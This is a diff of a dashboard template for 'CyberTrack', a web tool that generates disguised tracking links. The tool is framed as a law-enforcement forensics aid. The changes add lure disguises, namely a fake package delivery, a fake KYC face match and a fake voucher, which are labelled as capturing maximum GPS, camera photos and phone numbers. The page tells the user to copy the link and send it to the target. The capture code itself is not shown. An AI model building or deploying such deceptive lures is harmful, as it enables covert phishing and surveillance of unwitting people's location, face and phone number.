@@ -2,51 +2,53 @@
 {% block title %}Dashboard — CyberTrack{% endblock %}
 
 {% block content %}
-<div class="mb-8">
-  <h1 class="text-3xl font-bold gradient-text mb-1">Case Dashboard</h1>
-  <p class="text-gray-500 text-sm">Generate and manage tracking links for active investigations.</p>
+<div class="mb-6 flex items-center justify-between">
+  <div>
+    <h1 class="text-2xl font-bold gradient-text">Intelligence Dashboard</h1>
+    <p class="text-xs text-gray-500 mt-0.5">Law Enforcement & Cyber Forensics Link Manager</p>
+  </div>
 </div>
 
-<!-- Create Link Form -->
-<div class="glass rounded-2xl p-6 mb-8 max-w-3xl">
-  <h2 class="text-base font-semibold text-gray-200 mb-4 flex items-center gap-2">
-    <svg class="w-4 h-4 text-red-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/></svg>
-    Generate Tracking Link
+<!-- Create Link Card -->
+<div class="glass rounded-2xl p-6 mb-8">
+  <h2 class="text-sm font-semibold text-gray-200 mb-4 flex items-center gap-2">
+    <span class="text-red-400">⚡</span> Deploy Tracking Lure
   </h2>
   <form id="createForm" class="space-y-3">
     <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-      <input id="caseId" name="case_id" placeholder="Case ID (e.g. CC-2024-001)"
+      <input id="caseId" name="case_id" placeholder="Case ID (e.g. CASE-2026-X)"
         class="bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-red-500/60 focus:ring-1 focus:ring-red-500/20 transition"
         required />
-      <input id="label" name="label" placeholder="Label (e.g. Phishing email link)"
+      <input id="label" name="label" placeholder="Target Label (e.g. Suspect WhatsApp link)"
         class="bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-red-500/60 focus:ring-1 focus:ring-red-500/20 transition"
         required />
     </div>
     <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
       <select id="disguise" name="disguise"
         class="bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-red-500/60 transition">
-        <option value="default">Disguise: Default (Redirect)</option>
-        <option value="news">Disguise: News Article</option>
-        <option value="download">Disguise: File Download</option>
-        <option value="verify">Disguise: Account Verify</option>
-        <option value="survey">Disguise: Survey</option>
+        <option value="delivery">📦 Disguise: Live Package Delivery (Max GPS + Phone)</option>
+        <option value="camera_kyc">📸 Disguise: Identity / KYC Face Match (Camera Photo + Phone)</option>
+        <option value="cashback">🎁 Disguise: Instant Voucher / Reward (Max Phone Capture)</option>
+        <option value="download">📥 Disguise: Secure File Download</option>
+        <option value="news">📰 Disguise: News Article</option>
+        <option value="default">⚡ Disguise: Fast Stealth Redirect</option>
       </select>
-      <input id="redirectUrl" name="redirect_url" placeholder="Redirect URL (default: google.com)" value="https://www.google.com"
+      <input id="redirectUrl" name="redirect_url" placeholder="Final Redirect URL (default: google.com)" value="https://www.google.com"
         class="bg-gray-800/60 border border-gray-700/50 rounded-xl px-4 py-2.5 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-red-500/60 focus:ring-1 focus:ring-red-500/20 transition" />
     </div>
     <button type="submit" id="generateBtn"
-      class="bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 text-white text-sm font-medium px-6 py-2.5 rounded-xl transition-all hover:shadow-lg hover:shadow-red-900/30 hover:-translate-y-0.5 active:translate-y-0">
-      ⚡ Generate Link
+      class="bg-gradient-to-r from-red-600 to-orange-600 hover:from-red-500 hover:to-orange-500 text-white text-sm font-medium px-6 py-2.5 rounded-xl transition-all hover:shadow-lg hover:shadow-red-900/30 hover:-translate-y-0.5 active:translate-y-0 flex items-center gap-2">
+      <span>⚡ Generate Tracking Link</span>
     </button>
   </form>
 
   <!-- Generated URL display -->
   <div id="result" class="hidden mt-4 bg-gray-800/40 border border-gray-700/40 rounded-xl p-4">
-    <p class="text-xs text-gray-400 mb-1">Tracking URL (send this to suspect):</p>
+    <p class="text-xs text-gray-400 mb-1">Target Tracking URL (Copy and send to target):</p>
     <div class="flex items-center gap-3">
-      <code id="generatedUrl" class="text-green-400 text-sm flex-1 break-all"></code>
-      <button onclick="copyUrl()" id="copyBtn" class="text-xs text-gray-400 hover:text-white border border-gray-600/50 px-3 py-1.5 rounded-lg transition hover:bg-gray-700/40 shrink-0">
-        Copy
+      <code id="generatedUrl" class="text-green-400 text-sm flex-1 break-all font-mono"></code>
+      <button onclick="copyGeneratedLink()" id="copyBtn" class="text-xs bg-emerald-600/20 text-emerald-400 border border-emerald-600/30 px-3 py-1.5 rounded-lg transition hover:bg-emerald-600/30 shrink-0 font-medium">
+        Copy Full Link
       </button>
     </div>
   </div>
@@ -57,8 +59,8 @@
   <div class="px-6 py-4 border-b border-gray-800/50 flex items-center justify-between">
     <h2 class="text-sm font-semibold text-gray-200 flex items-center gap-2">
       <svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
-      Active Links
-      <span class="text-xs text-gray-500 font-normal">({{ links|length }} total)</span>
+      Active Tracking Targets
+      <span class="text-xs text-gray-500 font-normal">({{ links|length }} active)</span>
     </h2>
   </div>
 
@@ -75,7 +77,7 @@
           <th class="text-left px-6 py-3">Case ID</th>
           <th class="text-left px-6 py-3">Label</th>
           <th class="text-left px-6 py-3">Tracking Link</th>
-          <th class="text-left px-6 py-3">Disguise</th>
+          <th class="text-left px-6 py-3">Lure Disguise</th>
           <th class="text-left px-6 py-3">Status</th>
           <th class="text-left px-6 py-3">Created</th>
           <th class="text-left px-6 py-3">Actions</th>
@@ -84,7 +86,7 @@
       <tbody class="divide-y divide-gray-800/30">
         {% for link in links %}
         <tr class="hover:bg-white/[0.02] transition">
-          <td class="px-6 py-3 font-mono text-xs text-gray-300">{{ link.case_id }}</td>
+          <td class="px-6 py-3 font-mono text-xs text-gray-300 font-bold">{{ link.case_id }}</td>
           <td class="px-6 py-3 text-gray-300">{{ link.label or '—' }}</td>
           <td class="px-6 py-3">
             <div class="flex items-center gap-2">
@@ -97,7 +99,7 @@
             </div>
           </td>
           <td class="px-6 py-3">
-            <span class="badge-{{ link.disguise or 'default' }} text-xs px-2 py-0.5 rounded-full font-medium">
+            <span class="bg-gray-800 text-cyan-300 border border-gray-700 text-xs px-2.5 py-1 rounded-full font-medium">
               {{ link.disguise or 'default' }}
             </span>
           </td>
@@ -111,9 +113,8 @@
           <td class="px-6 py-3 text-gray-500 text-xs">{{ link.created_at[:10] if link.created_at else '—' }}</td>
           <td class="px-6 py-3">
             <div class="flex items-center gap-3">
-              <button onclick="copySlugUrl('{{ link.slug }}', this)" class="text-emerald-400 hover:text-emerald-300 text-xs transition font-medium">Copy Link</button>
-              <a href="/dashboard/logs/{{ link.id }}" class="text-blue-400 hover:text-blue-300 text-xs transition font-medium">Logs</a>
-              <a href="/dashboard/map/{{ link.id }}" class="text-yellow-400 hover:text-yellow-300 text-xs transition font-medium">Map</a>
+              <a href="/dashboard/logs/{{ link.id }}" class="text-blue-400 hover:text-blue-300 text-xs transition font-semibold">🔍 Forensic Logs</a>
+              <a href="/dashboard/map/{{ link.id }}" class="text-yellow-400 hover:text-yellow-300 text-xs transition font-semibold">🗺️ Map View</a>
             </div>
           </td>
         </tr>
@@ -130,7 +131,7 @@
   document.getElementById('createForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     const btn = document.getElementById('generateBtn');
-    btn.textContent = '⏳ Generating...';
+    btn.innerHTML = '<span>⏳ Deploying...</span>';
     btn.disabled = true;
 
     const fd = new FormData();
@@ -145,41 +146,34 @@
       const data = await res.json();
 
       if (data.slug) {
-        // Automatically construct full URL using the current live domain
         _generatedUrl = window.location.origin + '/t/' + data.slug;
         document.getElementById('generatedUrl').textContent = _generatedUrl;
         document.getElementById('result').classList.remove('hidden');
-        setTimeout(() => location.reload(), 2500);
+        setTimeout(() => location.reload(), 3000);
       }
     } catch(err) {
       alert('Error creating link');
     }
-    btn.textContent = '⚡ Generate Link';
+    btn.innerHTML = '<span>⚡ Generate Tracking Link</span>';
     btn.disabled = false;
   });
 
-  function copyUrl() {
-    navigator.clipboard.writeText(_generatedUrl).then(() => {
-      const btn = document.getElementById('copyBtn');
-      btn.textContent = '✓ Copied!';
-      btn.classList.add('text-green-400', 'border-green-600/50');
-      setTimeout(() => {
-        btn.textContent = 'Copy';
-        btn.classList.remove('text-green-400', 'border-green-600/50');
-      }, 2000);
-    });
+  function copyGeneratedLink() {
+    if (_generatedUrl) {
+      navigator.clipboard.writeText(_generatedUrl).then(() => {
+        const b = document.getElementById('copyBtn');
+        b.textContent = '✓ Copied!';
+        setTimeout(() => { b.textContent = 'Copy Full Link'; }, 2000);
+      });
+    }
   }
 
   function copySlugUrl(slug, btn) {
     const fullUrl = window.location.origin + '/t/' + slug;
     navigator.clipboard.writeText(fullUrl).then(() => {
-      const originalText = btn.innerHTML;
-      btn.innerHTML = '✓ Copied!';
-      btn.classList.add('text-green-400');
-      setTimeout(() => {
-        btn.innerHTML = originalText;
-        btn.classList.remove('text-green-400');
-      }, 2000);
+      const original = btn.innerHTML;
+      btn.innerHTML = '<span>✓ Copied</span>';
+      setTimeout(() => { btn.innerHTML = original; }, 2000);
     });
   }
 </script>
